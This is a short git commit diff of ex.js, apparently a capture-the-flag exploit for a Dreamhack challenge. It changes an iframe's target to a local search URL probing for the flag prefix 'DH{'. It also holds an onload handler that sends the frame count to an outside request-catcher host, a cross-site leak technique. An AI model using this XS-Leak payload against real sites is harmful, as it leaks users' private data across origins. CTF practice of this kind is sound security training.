c2bd96326c70f4c4d8bcd519ed22799310822b5b
parkttule <100356715+parkttule@users.noreply.github.com>
2023-02-17 15:43:40 +0900

    Update ex.js

--- ex.js
+++ ex.js
@@ -2,7 +2,7 @@
 <img id="img">
 <script>
 const iframe = document.getElementById("iframe");
-iframe.src="http://127.0.0.1/search?query=DH{";
+iframe.src="http://localhost:8000/search?query=DH{";
 iframe.onload = () => {
 	img.src = `https://znhdopn.request.dreamhack.games/${iframe.contentWindow.frames.length}`;
 };
